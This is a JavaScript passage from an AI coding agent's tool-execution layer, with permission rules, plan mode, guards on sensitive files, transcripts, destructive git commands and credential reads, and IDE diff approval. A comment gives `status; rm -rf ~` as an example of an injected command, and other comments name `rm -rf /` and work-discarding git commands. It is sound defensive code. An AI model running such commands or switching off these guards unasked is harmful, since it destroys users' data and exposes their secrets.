        if (fs.existsSync(rulesPath)) {
          const content = fs.readFileSync(rulesPath, "utf-8");
          if (content.trim()) {
            prompt += `\n\n## Project Rules\n${content}`;
          }
        }
      }
    } catch {
      // Non-critical
    }
  }

  // Advertise extra workspace roots (--add-dir) so the model knows it may
  // reach beyond cwd and which absolute paths to use.
  const extraDirs = Array.isArray(opts.additionalDirectories)
    ? opts.additionalDirectories.filter(Boolean)
    : [];
  if (extraDirs.length > 0) {
    prompt +=
      `\n\n## Additional working directories\n` +
      `Beyond the current working directory, you may read, search, and edit ` +
      `files under these absolute roots. Pass absolute paths to access them:\n` +
      extraDirs.map((d) => `- ${d}`).join("\n");
  }

  // Advertise user-defined slash commands (.claude/commands/*.md etc.) so the
  // model knows which prompt macros it can run via the slash_command tool.
  try {
    const macros = discoverCommands(dir);
    if (macros.length > 0) {
      prompt +=
        `\n\n## Available slash commands\n` +
        `These are reusable prompt macros the user has defined. Run one with ` +
        `the slash_command tool (e.g. {"command":"/${macros[0].name}"}) when it ` +
        `fits the task; the tool returns the command's expanded instructions ` +
        `for you to carry out.\n` +
        macros
          .map(
            (m) =>
              `- /${m.name}` +
              (m.argumentHint ? ` ${m.argumentHint}` : "") +
              (m.description ? ` — ${m.description}` : ""),
          )
          .join("\n");
    }
  } catch {
    // Non-critical — command discovery failure must not break the prompt.
  }

  return prompt;
}

// ─── Tool execution ──────────────────────────────────────────────────────

/** The file-mutating tools whose `ask` can be reviewed as an IDE diff. */
const IDE_DIFF_EDIT_TOOLS = new Set([
  "write_file",
  "edit_file",
  "edit_file_hashed",
]);

/**
 * Quote-aware shell tokenizer (mirrors gateways/ws `tokenizeCommand`). The `git`
 * tool runs the model-supplied command via argv (spawnSync, NO shell), so a
 * string like `status; rm -rf ~` can't inject a second command through the
 * shell — git just sees `status;` as an unknown subcommand. A quoted arg (e.g.
 * a commit message) keeps its content because quotes are consumed here.
 */
export function tokenizeShellWords(input) {
  const args = [];
  let current = "";
  let inDouble = false;
  let inSingle = false;
  let escape = false;
  for (const ch of String(input || "")) {
    if (escape) {
      current += ch;
      escape = false;
      continue;
    }
    if (ch === "\\" && inDouble) {
      escape = true;
      continue;
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      continue;
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      continue;
    }
    if ((ch === " " || ch === "\t") && !inDouble && !inSingle) {
      if (current.length > 0) {
        args.push(current);
        current = "";
      }
      continue;
    }
    current += ch;
  }
  if (current.length > 0) args.push(current);
  return args;
}

/**
 * Literal string edit shared by the edit_file preview + execution paths.
 * Uses split/join so `old_string` and `new_string` are treated as LITERAL text
 * (no regex / `$&` / `$1` pattern interpretation — a plain `String.replace`
 * with a string pattern still expands `$` sequences in the replacement).
 * Returns the occurrence count so the caller can require a UNIQUE match
 * (Claude-Code Edit parity): replacing the first of several identical strings
 * silently edits the wrong place.
 *
 * @returns {{ count:number, newContent:string }}
 */
function applyLiteralEdit(content, oldStr, newStr, replaceAll) {
  const parts = content.split(oldStr);
  const count = parts.length - 1;
  if (count === 0) return { count: 0, newContent: content };
  const newContent = replaceAll
    ? parts.join(newStr)
    : parts[0] + newStr + parts.slice(1).join(oldStr); // first occurrence only
  return { count, newContent };
}

/**
 * Compute the content an edit tool WOULD write, without writing it — the
 * left/right sides for an IDE diff review. Mirrors the corresponding
 * executeToolInner cases exactly (write_file / edit_file / edit_file_hashed,
 * the latter via the same pure replaceByHash). Returns
 * `{ filePath, newContent, originalText|null }` or null when the edit cannot
 * be computed (missing file, anchor/old_string miss, bad args) — the caller
 * then falls back to the normal confirmation path so the tool can produce its
 * own diagnostics.
 */
export function computeProposedEdit(name, args = {}, cwd = process.cwd()) {
  try {
    if (!args.path) return null;
    const filePath = path.resolve(cwd, args.path);
    if (name === "write_file") {
      if (typeof args.content !== "string") return null;
      const originalText = fs.existsSync(filePath)
        ? fs.readFileSync(filePath, "utf8")
        : "";
      return { filePath, newContent: args.content, originalText };
    }
    if (name === "edit_file") {
      if (!fs.existsSync(filePath)) return null;
      const content = fs.readFileSync(filePath, "utf8");
      if (
        typeof args.old_string !== "string" ||
        args.old_string === "" ||
        typeof args.new_string !== "string"
      ) {
        return null;
      }
      const replaceAll = args.replace_all === true;
      const { count, newContent } = applyLiteralEdit(
        content,
        args.old_string,
        args.new_string,
        replaceAll,
      );
      // No match, or a non-unique match without replace_all → the edit will be
      // rejected, so show no (misleading) diff and let the tool report it.
      if (count === 0 || (count > 1 && !replaceAll)) return null;
      return { filePath, newContent, originalText: content };
    }
    if (name === "edit_file_hashed") {
      if (!fs.existsSync(filePath)) return null;
      if (!args.anchor_hash || typeof args.new_line !== "string") return null;
      const original = fs.readFileSync(filePath, "utf8");
      const result = replaceByHash(original, {
        anchorHash: args.anchor_hash,
        expectedLine: args.expected_line,
        newLine: args.new_line,
      });
      if (!result.success) return null;
      return { filePath, newContent: result.content, originalText: original };
    }
  } catch {
    // unreadable file etc. → no proposal, normal path handles it
  }
  return null;
}

/**
 * Shared IDE-diff approval routing for an `ask` decision about a file edit
 * (used by BOTH the settings-rules ask and the PreToolUse-hook ask). Returns
 *   { outcome:"accepted", result }  — the IDE wrote the file; the caller MUST
 *                                     return `result` and skip execution
 *   { outcome:"rejected", result }  — deny with `result`, file untouched
 *   null                            — not applicable (non-edit tool, headless,
 *                                     no IDE, disabled, no proposal, IDE died)
 *                                     → caller falls back to its own confirm.
 */
async function tryIdeDiffApprovalForEdit(
  name,
  args,
  context,
  cwd,
  { rule, source } = {},
) {
  if (!IDE_DIFF_EDIT_TOOLS.has(name)) return null;
  if (typeof context.permissionConfirm !== "function") return null; // interactive only
  if (!context.mcpClient || !context.externalToolExecutors) return null;
  try {
    const {
      ideDiffApprovalEnabled,
      hasIdeOpenDiff,
      requestIdeDiffApproval,
      formatReviewComments,
      summarizeUserAmendments,
    } = await import("../lib/ide-context.js");
    const mcpLike = {
      mcpClient: context.mcpClient,
      externalToolExecutors: context.externalToolExecutors,
    };
    if (!ideDiffApprovalEnabled() || !hasIdeOpenDiff(mcpLike)) return null;
    const proposal = computeProposedEdit(name, args, cwd);
    if (!proposal) return null;
    const verdict = await requestIdeDiffApproval(mcpLike, {
      path: proposal.filePath,
      modifiedText: proposal.newContent,
      originalText: proposal.originalText,
      title: `cc agent: ${name} ${path.basename(proposal.filePath)}`,
    });
    if (verdict?.outcome === "accepted") {
      // When the reviewer amended the proposal in the diff before accepting,
      // hand the agent the actual -/+ delta — not just a flag — so its model
      // of the file matches what was really written (gap #4: the agent
      // perceives the user's edits).
      const amendments =
        verdict.finalText != null && verdict.finalText !== proposal.newContent
          ? summarizeUserAmendments(proposal.newContent, verdict.finalText)
          : null;
      return {
        outcome: "accepted",
        result: {
          success: true,
          path: proposal.filePath,
          appliedVia: "ide-diff",
          ...(amendments
            ? { userEdited: true, userAmendments: amendments }
            : {}),
          policy: { decision: "allow", rule, via: "ide-diff" },
        },
      };
    }
    if (verdict?.outcome === "rejected") {
      return {
        outcome: "rejected",
        result: {
          error: `[Permission] "${name}" was rejected in the IDE diff review (${source}: ${rule}).`,
          policy: { decision: "deny", rule, via: "ide-diff" },
        },
      };
    }
    if (verdict?.outcome === "changes-requested") {
      // The reviewer annotated the diff instead of accepting/rejecting: the
      // file is untouched and the notes flow back as the tool result, so the
      // agent revises and re-proposes (Claude-Code inline-review parity).
      const feedback =
        formatReviewComments(verdict.comments, { path: proposal.filePath }) ||
        "The user requested changes in the IDE diff review (no specific notes).";
      return {
        outcome: "changes-requested",
        result: {
          error:
            `[IDE review] "${name}" was NOT applied — the user requested changes:\n` +
            `${feedback}\n` +
            "Revise the edit to address this feedback, then propose it again.",
          policy: { decision: "deny", rule, via: "ide-diff-review" },
          reviewComments: verdict.comments,
        },
      };
    }
  } catch (_err) {
    // diff-approval routing is best-effort — fall back to the normal confirm
  }
  return null;
}

/**
 * Execute a single tool call with plan-mode filtering and hook pipeline.
 *
 * @param {string} name - tool name
 * @param {object} args - tool arguments
 * @param {object} [context] - optional context
 * @param {object} [context.hookDb] - DB for hooks
 * @param {CLISkillLoader} [context.skillLoader] - skill loader instance
 * @param {string} [context.cwd] - working directory override
 * @returns {Promise<object>} tool result
 */
export async function executeTool(name, args, context = {}) {
  const hookDb = context.hookDb || null;
  const skillLoader = context.skillLoader || _defaultSkillLoader;
  const cwd = context.cwd || process.cwd();
  const planManager = context.planManager || getPlanModeManager();
  const localToolDescriptor =
    context.externalToolDescriptors &&
    typeof context.externalToolDescriptors === "object"
      ? context.externalToolDescriptors[name] || null
      : null;
  const runtimeDescriptor =
    getRuntimeToolDescriptor(name) || localToolDescriptor;
  const admission = context.toolAdmission;
  if (admission?.enforce === true) {
    const override =
      admission.tools && typeof admission.tools === "object"
        ? admission.tools[name] || {}
        : {};
    const tier =
      override.tier ||
      runtimeDescriptor?.tier ||
      getCodingAgentToolPolicy(name)?.tier ||
      (localToolDescriptor ? "extension" : "mvp");
    const decision = admitTool({
      tool: name,
      tier,
      capabilityGranted:
        override.capabilityGranted ?? admission.capabilityGranted,
      policyAllowed:
        override.policyAllowed ??
        (context.hostManagedToolPolicy ?
          ((context.hostManagedToolPolicy?.tools ||
            context.hostManagedToolPolicy?.toolPolicies || {})[name]
            ?.allowed !== false) :
          admission.policyAllowed),
      permissionGranted:
        override.permissionGranted ?? admission.permissionGranted,
      budgetOk: override.budgetOk ?? admission.budgetOk,
      uiSupported: override.uiSupported ?? admission.uiSupported,
    });
    const attribution = buildToolAttribution({
      tool: name,
      source:
        override.source ||
        runtimeDescriptor?.source ||
        localToolDescriptor?.source ||
        admission.source ||
        null,
      version: override.version || runtimeDescriptor?.version || null,
      scope: override.scope || localToolDescriptor?.scope || null,
      callId: context.toolCallId || null,
      decision,
    });
    if (!decision.admitted) {
      return {
        error: `[Tool Admission] Tool "${name}" was not admitted: ${decision.unmet.join(", ")}.`,
        toolAttribution: attribution,
        policy: { decision: "blocked", via: "tool-admission" },
      };
    }
    context = { ...context, toolAttribution: attribution };
  }
  const toolContext = createToolContext({
    toolName: runtimeDescriptor?.name || name,
    cwd,
    metadata: { descriptor: runtimeDescriptor },
  });

  // Persona toolsDisabled guard
  const persona = _loadProjectPersona(cwd);
  if (persona?.toolsDisabled?.includes(name)) {
    return {
      error: `Tool "${name}" is disabled by project persona configuration.`,
    };
  }

  // ── Permission resolution (most-restrictive-wins; denies before prompts) ──
  // Two policy sources gate a tool call: the user's .claude/settings.json rules
  // (deny/ask/allow) and the desktop host's synced policy (hostManagedToolPolicy,
  // usually null in CLI). Precedence, evaluated in this exact order:
  //   1. settings `deny`  → block.
  //   2. host  `deny`     → block. A settings `allow` NEVER relaxes a host deny
  //                         (the desktop runtime authority outranks project
  //                         config); symmetrically a settings `deny` (step 1)
  //                         outranks a host `allow`. Net effect: any deny wins.
  //   3. settings `ask`   → confirm (headless w/o confirmer falls closed).
  //                         Reached only after BOTH denies clear, so a denied
  //                         tool never wastes a confirmation round-trip.
  //   4. settings `allow` → pre-authorize (ruleAllowed): short-circuit the
  //                         plan-mode block + run_shell ApprovalGate. The hard
  //                         shell-policy denylist still applies — allow never
  //                         re-enables an unsafe `rm -rf /`.
  // No matching rule + no host policy → every existing layer runs unchanged
  // (default behaviour is byte-for-byte).
  const settingsVerdict = context.permissionRules
    ? evaluatePermissionRules({
        tool: name,
        args,
        cwd,
        rules: context.permissionRules,
      })
    : { decision: null, rule: null };

  // 1. settings deny
  if (settingsVerdict.decision === "deny") {
    return {
      error: `[Permission] Tool "${name}" denied by settings rule: ${settingsVerdict.rule}. This is a configured policy — retrying won't help; tell the user if the task genuinely needs it.`,
      policy: { decision: "deny", rule: settingsVerdict.rule, via: "settings" },
    };
  }

  // Resolve the host policy (needed for the host-deny check + the plan-mode
  // block below). Computed once here so a host deny can short-circuit before
  // any settings `ask` prompt.
  const toolPolicies =
    context.hostManagedToolPolicy?.tools ||
    context.hostManagedToolPolicy?.toolPolicies ||
    null;
  const hostToolPolicy =
    toolPolicies && typeof toolPolicies === "object"
      ? toolPolicies[name]
      : null;
  const isExternalHostTool =
    hostToolPolicy && !STATIC_AGENT_TOOL_NAMES.has(name);
  const isExternalLocalTool =
    localToolDescriptor && !STATIC_AGENT_TOOL_NAMES.has(name);
  const hostPolicyAllowsReadOnlyGit =
    name === "git" &&
    hostToolPolicy?.planModeBehavior === "readonly-conditional" &&
    isReadOnlyGitCommand(args.command);
  const localReadOnlyAllowedInPlanMode =
    isExternalLocalTool &&
    planManager.isActive() &&
    localToolDescriptor?.isReadOnly === true;

  // 2. host deny (a settings `allow` does not relax this)
  if (
    hostToolPolicy &&
    hostToolPolicy.allowed === false &&
    !hostPolicyAllowsReadOnlyGit
  ) {
    return {
      error: `[Host Policy] Tool "${name}" is blocked by desktop host policy. ${hostToolPolicy.reason || "Desktop approval has not been synchronized yet."}`,
      policy: {
        decision: hostToolPolicy.decision || "blocked",
        requiresPlanApproval: hostToolPolicy.requiresPlanApproval === true,
        requiresConfirmation: hostToolPolicy.requiresConfirmation === true,
        riskLevel: hostToolPolicy.riskLevel || null,
      },
    };
  }

  // 3 + 4. settings ask / allow (only reached when neither layer denied)
  let ruleAllowed = false;
  if (settingsVerdict.decision === "ask") {
    // IDE-native diff approval (Claude-Code parity): for file edits in an
    // interactive session with an IDE bridge connected, review the edit in
    // the editor instead of a terminal y/N. Accepted = the IDE wrote the
    // file → return the synthetic result and SKIP execution; rejected =
    // deny; null = fall through to the normal confirm below. Shared with the
    // PreToolUse-hook ask path (tryIdeDiffApprovalForEdit).
    const ide = await tryIdeDiffApprovalForEdit(name, args, context, cwd, {
      rule: settingsVerdict.rule,
      source: "settings rule",
    });
    if (ide) return ide.result;
    const ok = await requestInteractivePermission(name, args, context, cwd, {
      tool: name,
      args,
      rule: settingsVerdict.rule,
      reason: `settings rule ${settingsVerdict.rule} requires confirmation`,
    });
    if (!ok) {
      return {
        error: `[Permission] Tool "${name}" requires confirmation (settings rule: ${settingsVerdict.rule}) but this run is non-interactive — denied. Do not retry; tell the user this action needs their approval.`,
        policy: {
          decision: "ask",
          rule: settingsVerdict.rule,
          via: "settings",
        },
      };
    }
    ruleAllowed = true; // confirmed → treat like allow downstream
  } else if (settingsVerdict.decision === "allow") {
    ruleAllowed = true;
  }

  // Sensitive-file write guard (Claude-Code 2.1.160 parity): shell startup
  // files / PowerShell profiles / git+husky hooks execute code on the user's
  // next shell or commit — even otherwise-permitted edit flows confirm first.
  // Auto-exec configs (.vscode/tasks.json, .mcp.json, .idea run configs, …)
  // ride the same gate via autoExecConfigReason.
  // An explicit settings `allow` rule is the only bypass (exact user
  // pre-authorization); headless without a confirmer fails closed.
  if (
    (name === "write_file" ||
      name === "edit_file" ||
      name === "notebook_edit") &&
    settingsVerdict.decision !== "allow" &&
    args?.path
  ) {
    const { sensitiveFileReason, autoExecConfigReason } =
      await import("../lib/sensitive-file-guard.js");
    const sensReason =
      sensitiveFileReason(args.path) || autoExecConfigReason(args.path);
    if (sensReason) {
      const ok = await requestInteractivePermission(name, args, context, cwd, {
        tool: name,
        args,
        rule: null,
        reason: `sensitive file: ${sensReason}`,
      });
      if (!ok) {
        return {
          error: `[Sensitive File] Writing "${args.path}" requires confirmation (${sensReason}) — denied. Add a settings allow rule to pre-authorize.`,
          policy: { decision: "ask", via: "sensitive-file" },
        };
      }
    }
  }

  // Session-store write guard (transcript tamper protection): JSONL
  // transcripts under ~/.chainlesschain/sessions are hash-chained and treated
  // as an audit surface — an agent editing a transcript rewrites the history
  // that `cc session verify` and resume trust. Same posture as the
  // sensitive-file guard: confirm-first, an explicit settings `allow` rule is
  // the only bypass, headless without a confirmer fails closed.
  if (
    (name === "write_file" ||
      name === "edit_file" ||
      name === "notebook_edit") &&
    settingsVerdict.decision !== "allow" &&
    args?.path
  ) {
    const { sessionStorePathReason } =
      await import("../lib/session-store-guard.js");
    const storeReason = sessionStorePathReason(args.path, { cwd });
    if (storeReason) {
      const ok = await requestInteractivePermission(name, args, context, cwd, {
        tool: name,
        args,
        rule: null,
        reason: `session store: ${storeReason}`,
      });
      if (!ok) {
        return {
          error: `[Session Store] Writing "${args.path}" would modify a session transcript (${storeReason}) — denied. Add a settings allow rule to pre-authorize.`,
          policy: { decision: "ask", via: "session-store-guard" },
        };
      }
    }
  }

  // Destructive-git guard (Claude-Code 2.1.183 parity: "destructive git
  // commands blocked when unintended"). The `git` tool otherwise runs any
  // command unguarded in auto mode — including `reset --hard`, `clean -fd`,
  // `restore .`, `push --force`, `branch -D`, `rebase`, `reflog expire` —
  // which irrecoverably discard work. An explicit settings `allow`/confirmed
  // `ask` (ruleAllowed) pre-authorizes; headless without a confirmer fails
  // closed. Plan mode already blocks non-read-only git below.
  if (
    name === "git" &&
    !ruleAllowed &&
    !planManager.isActive() &&
    isDangerousGitCommand(args?.command)
  ) {
    const ok = await requestInteractivePermission(name, args, context, cwd, {
      tool: name,
      args,
      rule: null,
      reason: `destructive git command: git ${normalizeGitCommand(args.command)}`,
    });
    if (!ok) {
      return {
        error: `[Destructive Git] "git ${normalizeGitCommand(args.command)}" discards work irrecoverably and requires confirmation — denied. Add a settings allow rule to pre-authorize.`,
        policy: { decision: "ask", via: "destructive-git" },
      };
    }
  }

  // Credential READ guard (Claude-Code 2.1.189 parity: `sandbox.credentials`
  // blocks reads of credential files / secret env vars). cc has no OS sandbox,
  // so the same intent is enforced at the tool layer: pulling the user's secrets
  // into model context is a confirm-first action. `read_file` aimed at a
  // credential file, and `run_shell` commands that cat a credential file or echo
  // a secret env var, are gated. An explicit settings `allow`/confirmed `ask`
  // (ruleAllowed) pre-authorizes; headless without a confirmer fails closed;
  // `CC_CREDENTIAL_GUARD=0` disables it. Unlike --safe-mode (which weakens
  // customizations), this safety surface stays on under --safe-mode by design.
  if (!ruleAllowed && (name === "read_file" || name === "run_shell")) {
    const {
      credentialFileReasonResolved,
      commandReadsCredentials,
      credentialGuardDisabled,
    } = await import("../lib/credential-guard.js");
    if (!credentialGuardDisabled(process.env)) {
      let credReason = null;
      if (name === "read_file" && args?.path) {
        // Resolve symlinks: an innocent-named link to a credential file must not
        // skip the prompt (fs.readFileSync follows the link).
        credReason = credentialFileReasonResolved(args.path, { cwd });
      } else if (name === "run_shell" && args?.command) {
        const hit = commandReadsCredentials(args.command);
        credReason = hit ? hit.reason : null;
      }
      if (credReason) {
        const ok = await requestInteractivePermission(
          name,
          args,
          context,
          cwd,
          {
            tool: name,
            args,
            rule: null,
            reason: `credential access: ${credReason}`,
          },
        );
        if (!ok) {
          const what =
            name === "read_file" ? `Reading "${args.path}"` : "This command";
          return {
            error: `[Credential Guard] ${what} accesses secrets (${credReason}) and requires confirmation — denied. Add a settings allow rule, or set CC_CREDENTIAL_GUARD=0 to bypass.`,
            policy: { decision: "ask", via: "credential-guard" },
          };
        }
      }
    }
  }

  // Plan mode: check if tool is allowed (a settings `allow` rule pre-authorizes)
  if (
    planManager.isActive() &&
    !ruleAllowed &&
    !(name === "git" && isReadOnlyGitCommand(args.command)) &&
    !planManager.isToolAllowed(name) &&
    !(isExternalHostTool && hostToolPolicy?.allowed === true) &&
    !localReadOnlyAllowedInPlanMode
  ) {
    planManager.addPlanItem({
      title: `${name}: ${formatToolArgs(name, args)}`,
      tool: name,
      params: args,
      estimatedImpact:
        name === "run_shell" ||
        name === "run_code" ||
        name === "git" ||
        localToolDescriptor?.riskLevel === "high"
          ? "high"
          : name === "write_file" || localToolDescriptor?.riskLevel === "medium"
            ? "medium"
            : "low",
    });
    return {
      error: `[Plan Mode] Tool "${name}" is blocked during planning. It has been added to the plan. Use /plan approve to execute.`,
    };
  }

  // PreToolUse hooks. DB hooks (cc hook add) stay observe-only — a failure
  // never blocks. settings.json hooks (context.settingsHooks) are decision-
  // capable: a `block` (exit 2 / {decision:block}) stops the tool here, an
  // `ask` routes to the confirmer. Runs after permission resolution so a
  // settings deny / host deny short-circuits before any hook process spawns.
  if (hookDb) {
    try {
      await executeHooks(hookDb, HookEvents.PreToolUse, {
        tool: name,
        args,
        timestamp: new Date().toISOString(),
        descriptor: runtimeDescriptor,
        context: toolContext,
      });
    } catch (_err) {
      // Hook failure should not block tool execution
    }
  }
  if (context.settingsHooks) {
    const pre = await runSettingsPreToolUseHooks(name, args, context, cwd);
    // A hook `ask` resolved by the IDE diff review: accepted → the IDE
    // already wrote the file, return the synthetic result and skip the tool;
    // rejected → the ide-diff deny shape (via:"ide-diff", not via:"hook").
    if (pre.ideApplied) return pre.ideApplied;
    if (pre.blocked) {
      if (pre.ideResult) return pre.ideResult;
      return {
        error: `[Hook] PreToolUse blocked "${name}"${pre.reason ? ": " + pre.reason : ""}`,
        policy: { decision: "block", via: "hook", hook: pre.hook || null },
      };
    }
  }

  const startTime = Date.now();
  let toolResult;
  try {
    toolResult = await executeToolInner(name, args, {
      skillLoader,
      // Subagent skill capability INTERSECT — forwarded to run_skill/list_skills.
      skillAllowlist: context.skillAllowlist ?? null,
      cwd,
      parentMessages: context.parentMessages,
      interaction: context.interaction,
      sessionId: context.sessionId || null,
      // Parent LLM config — documented at toolContext as forwarded to
      // spawn_sub_agent for provider/key inheritance; without this line it
      // never actually reached executeToolInner (sub-agents silently fell
      // back to config defaults and their usage was mis-attributed).
      llmOptions: context.llmOptions || null,
      // 用量归因: shared per-run sink for child-loop (sub-agent / isolated
      // skill) token usage, drained by agentLoop as attributed events.
      subAgentUsageSink: context.subAgentUsageSink || null,
      hostManagedToolPolicy: context.hostManagedToolPolicy || null,
      externalToolDescriptors: context.externalToolDescriptors || null,
      externalToolExecutors: context.externalToolExecutors || null,
      mcpClient: context.mcpClient || null,
      shellPolicyOverrides: context.shellPolicyOverrides || null,
      approvalGate: context.approvalGate || null,
      shellConfirm: context.shellConfirm || null,
      additionalDirectories: context.additionalDirectories || null,
      sandbox: context.sandbox || null,
      ruleAllowed,
      settingsVerdict,
      subAgentDepth: context.subAgentDepth || 0,
      subAgentBudget: context.subAgentBudget || null,
      // Effective contract of THIS loop (parent ceiling for a nested spawn) +
      // the MCP tool definitions this loop exposes (inheritable by a spawn).
      subAgentContract: context.subAgentContract || null,
      extraToolDefinitions: context.extraToolDefinitions || null,
      // Parent memory source — forwarded so a memory-granted spawn inherits it.
      memoryDb: context.memoryDb || null,
      permanentMemory: context.permanentMemory || null,
      interactiveApproval: context.interactiveApproval || false,
      settingsHooks: context.settingsHooks || null,
      signal: context.signal || null,
      backgroundSubAgents: context.backgroundSubAgents || null,
      toolAdmission: context.toolAdmission || null,
    });
  } catch (err) {
    if (hookDb) {
      try {
        await executeHooks(hookDb, HookEvents.ToolError, {
          tool: name,
          args,
          error: err.message,
        });
      } catch (_err) {
        // Non-critical
      }
    }
    throw err;
  }

  const durationMs = Date.now() - startTime;
  const status = toolResult?.error ? "error" : "completed";
  const telemetryRecord = createToolTelemetryRecord({
    descriptor: runtimeDescriptor,
    status,
    durationMs,
    sessionId: context.sessionId || null,
    metadata: { args },
  });
  if (toolResult && typeof toolResult === "object") {
    toolResult.toolTelemetryRecord = telemetryRecord;
    if (context.toolAttribution) {
      toolResult.toolAttribution = context.toolAttribution;
    }
  }

  // PostToolUse hook
  if (hookDb) {
    try {
      await executeHooks(hookDb, HookEvents.PostToolUse, {
        tool: name,
        args,
        result:
          typeof toolResult === "object"
            ? JSON.stringify(toolResult).substring(0, 500)
            : String(toolResult).substring(0, 500),
        descriptor: runtimeDescriptor,
        context: toolContext,
      });
    } catch (_err) {
      // Non-critical
    }
  }
  // settings.json PostToolUse hooks: can't un-run the tool, but a `block`
  // reason is attached as `hookFeedback` to be surfaced back to the model.
  if (context.settingsHooks && toolResult && typeof toolResult === "object") {
    try {
      const matched = collectHooks(context.settingsHooks, "PostToolUse", name);
      if (matched && matched.length > 0) {
        // `async:true` PostToolUse hooks must NOT block the tool loop — split
        // them off the synchronous decision path. Without this an async hook
        // ran synchronously here, defeating fire-and-forget (a background lint /
        // test after each edit would stall the turn).
        const { sync, async: asyncHooks } = partitionAsyncHooks(matched);
        const payload = withDeliveryId(
          "PostToolUse",
          {
            hook_event_name: "PostToolUse",
            tool_name: umbrellaFor(name),
            raw_tool_name: name,
            tool_input: args,
            tool_response:
              typeof toolResult === "object"
                ? JSON.stringify(toolResult).substring(0, 2000)
                : String(toolResult).substring(0, 2000),
            cwd,
            session_id: context.sessionId || null,
          },
          {
            sessionId: context.sessionId || null,
            traceId: context.hookTraceId || null,
            parentId: context.hookParentId || null,
          },
        );
        if (sync.length > 0) {
          const outcome = runCommandHooks(sync, payload, {
            cwd,
            event: "PostToolUse",
            broker,
          });
          if (outcome.decision === "block" && outcome.reason) {
            toolResult.hookFeedback = outcome.reason;
          }
        }
        // Fire-and-forget the async hooks onto the REPL-owned supervisor when
        // one is wired; results/rewakes drain into the next turn's context.
        if (asyncHooks.length > 0 && context.hookSupervisor) {
          context.hookSupervisor.dispatch(asyncHooks, payload, { cwd, broker });
        }
      }
    } catch (_err) {
      // PostToolUse hooks are best-effort
    }
  }

  // settings.json SubagentStop hooks: fire when a `spawn_sub_agent` tool call
  // finishes (Claude-Code SubagentStop parity). The subagent has already
  // returned its summary, so this is observe + feedback rather than force-
  // continue: a `block` reason is surfaced to the PARENT agent as hookFeedback
  // so it can react (e.g. re-spawn or adjust), mirroring PostToolUse.
  if (
    name === "spawn_sub_agent" &&
    context.settingsHooks &&
    toolResult &&
    typeof toolResult === "object" &&
    // Background spawns return a "running" handle here — their SubagentStop
    // fires later, when the RESULT is drained into the conversation.
    !(toolResult.background === true && toolResult.status === "running")
  ) {
    try {
      const outcome = runObserveHooks(
        context.settingsHooks,
        "SubagentStop",
        {
          stop_hook_active: false,
          session_id: context.sessionId || null,
          subagent_response:
            typeof toolResult === "object"
              ? JSON.stringify(toolResult).substring(0, 2000)
              : String(toolResult).substring(0, 2000),
        },
        {
          cwd,
          traceId: context.hookTraceId || null,
          parentId: context.hookParentId || null,
        },
      );
      if (outcome.decision === "block" && outcome.reason) {
        toolResult.hookFeedback = toolResult.hookFeedback
          ? `${toolResult.hookFeedback}\n${outcome.reason}`
          : outcome.reason;
      }
    } catch (_err) {
      // SubagentStop hooks are best-effort
    }
  }

  // IDE post-edit diagnostics (Claude-Code parity): after a successful file
  // mutation with an IDE bridge connected, pull the editor's fresh
  // error/warning diagnostics for that file into the tool result so the model
  // can fix what it just broke in the same loop. Best-effort, bounded;
  // CC_IDE_CONTEXT=0 disables alongside prompt-time context.
  if (
    (name === "write_file" ||
      name === "edit_file" ||
      name === "edit_file_hashed" ||
      name === "notebook_edit") &&
    toolResult &&
    typeof toolResult === "object" &&
    !toolResult.error &&
    args?.path &&
    context.mcpClient &&
    context.externalToolExecutors
  ) {
    try {
      const { collectIdeDiagnostics, formatIdeDiagnostics } =
        await import("../lib/ide-context.js");
      const diags = await collectIdeDiagnostics(
        {
          mcpClient: context.mcpClient,
          externalToolExecutors: context.externalToolExecutors,
        },
        path.resolve(cwd, args.path),
      );
      const feedback = formatIdeDiagnostics(diags);
      if (feedback) toolResult.ideDiagnostics = feedback;
    } catch (_err) {
      // diagnostics feedback is optional polish — never fail the tool
    }
  }

  return toolResult;
}

/**
 * Write a file then verify the on-disk byte count matches the intended
 * content. Network drives and cloud-synced folders (OneDrive / Dropbox /
 * Google Drive) can silently truncate a write or leave a 0-byte file; without
 * this check the agent reports `success` on a corrupted write and moves on.
 * Parity with Claude-Code 2.1.181 ("Fixed Write/Edit producing 0-byte or
 * truncated files on network drives and cloud-synced folders").
 *
 * Returns `{ size }` (actual on-disk bytes) on success, or `{ error }`
 * describing the truncation so the caller surfaces it as a tool error instead
 * of a false success. `fsImpl` is injectable for unit tests.
 */
export function writeFileVerified(filePath, content, fsImpl = fs) {
  const expected = Buffer.byteLength(content, "utf8");
  fsImpl.writeFileSync(filePath, content, "utf8");
  let actual;
  try {
    actual = fsImpl.statSync(filePath).size;
  } catch (err) {
    return {
      error: `Write verification failed: cannot stat ${filePath} after writing (${err.message}). The file may be on an unreliable network or cloud-synced drive.`,
    };
  }
  if (actual !== expected) {
    return {
      error: `Write truncated: expected ${expected} bytes but only ${actual} reached disk for ${filePath}. A network drive or cloud-sync folder (OneDrive/Dropbox/Google Drive) may have interrupted the write — retry, or write to a local path.`,
    };
  }
  return { size: actual };
}

// ── Edit-concurrency (read-freshness) guard ──────────────────────────────
//
// Per-session map: resolved file path → the mtimeMs the agent last OBSERVED for
// it (via read_file, or the write/edit it just made). If a file's on-disk mtime
// is NEWER than that when the agent tries to edit it, an external process wrote
// the file between the agent's read and its edit — so the edit is refused and
// the agent is told to re-read, instead of clobbering the concurrent change on
// top of a stale understanding. A file the agent never observed is NOT blocked
// (first-touch / create stays frictionless). Disable with CC_EDIT_FRESHNESS=0.
const _fileObservedMtimes = new Map();

/** Record the current mtime of a file the agent just read or wrote. */
function _recordFileObservation(filePath, fsImpl = fs) {
  try {
    _fileObservedMtimes.set(filePath, fsImpl.statSync(filePath).mtimeMs);
  } catch {
    /* best-effort — a stat failure just means no freshness baseline */
  }
}

/**
 * Return an error string when `filePath` changed on disk since the agent last
 * observed it (external concurrent edit), else null (fresh, un-observed, or
 * disabled).
 */
function _checkFileFreshness(filePath, fsImpl = fs) {
  if (process.env.CC_EDIT_FRESHNESS === "0") return null;
  const known = _fileObservedMtimes.get(filePath);
  if (known === undefined) return null; // never observed → don't block
  let current;
  try {
    current = fsImpl.statSync(filePath).mtimeMs;
  } catch {
    return null;
  }
  if (current > known) {
    return (
      `File changed on disk since you last read it: ${filePath}. Another ` +
      `process modified it after your last read — re-read the file before ` +
      `editing so your change is based on its current content (this guard ` +
      `prevents silently clobbering a concurrent edit; set CC_EDIT_FRESHNESS=0 ` +
      `to disable).`
    );
  }
  return null;
}

